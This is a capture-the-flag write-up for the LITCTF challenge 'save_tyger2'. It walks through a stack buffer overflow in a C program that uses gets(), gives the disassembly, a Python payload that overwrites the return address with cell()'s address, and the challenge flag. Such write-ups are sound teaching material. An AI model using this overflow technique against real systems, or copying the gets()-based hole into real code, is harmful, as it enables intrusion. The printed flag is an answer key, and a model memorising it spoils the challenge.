# pwn/save_tyger2

## Challenge

Tyger needs your help again.
<br>
Connect with `nc litctf.live 31788`

[`save_tyger2`](https://drive.google.com/file/d/1qCSTo01YjzrncT0SZGOTouC4egY_q-PX/view)

## Solution

Like [last time](./save_tyger.md), we're given a C file (and the executable):
```c
#include <stdlib.h>
#include <stdio.h>

void cell(){
	printf("Thank god you got him out of this cockroach-infested cell!\n");
	FILE *f = fopen("flag.txt", "r");
	char flag[64];
	if(f == NULL){
		printf("Something went wrong. Please let Eggag know.\n");
		exit(1);
	}
	fgets(flag, 64, f);
	puts(flag);
    exit(0);
}

int main(){
	char buf[32];
	printf("NOOOO, THEY TOOK HIM AGAIN!\n");
	printf("Please help us get him out or there is no way we will be able to prepare LIT :sadness:\n");
	gets(buf);
}
```
This is another classic problem.

We need to somehow call `cell()`. Note the usage of `gets` for input, which lets us write arbitrarily many characters, so we can overflow `buf` into the return address. We now look in the executable (`objdump -d`) for the address of `cell()`, and where `buf` is stored:
```
0000000000401162 <cell>:
...
00000000004011cd <main>:
  4011cd:	55                   	push   %rbp
  4011ce:	48 89 e5             	mov    %rsp,%rbp
  4011d1:	48 83 ec 20          	sub    $0x20,%rsp
  4011d5:	bf 7d 20 40 00       	mov    $0x40207d,%edi
  4011da:	e8 51 fe ff ff       	callq  401030 <puts@plt>
  4011df:	bf a0 20 40 00       	mov    $0x4020a0,%edi
  4011e4:	e8 47 fe ff ff       	callq  401030 <puts@plt>
  4011e9:	48 8d 45 e0          	lea    -0x20(%rbp),%rax <- buf
  4011ed:	48 89 c7             	mov    %rax,%rdi
  4011f0:	b8 00 00 00 00       	mov    $0x0,%eax
  4011f5:	e8 56 fe ff ff       	callq  401050 <gets@plt>
...
```
`cell()` is at `0x0000000000401162` (addresses are 64-bit, or 8 bytes). `buf` is at `%rbp - 0x20`.
That means we need `0x20 = `32 bytes to reach `%rbp`, which points to the address of the previous stack frame, which is 8 bytes long.
Past that is the return address location, so we need to skip 40 bytes total.
So we need to send 40 junk characters, and then `0x0000000000401162`:
```py
print("a"*40+"6211400000000000".decode("hex"))
```
Note the leading/trailing 0s are important, to overwrite the entirety of the original address.

Pipe the Python output into the netcat command, and we get our flag.

## Flag

`LITCTF{w3_w0nt_l3t_th3m_t4k3_tyg3r_3v3r_4gain}`
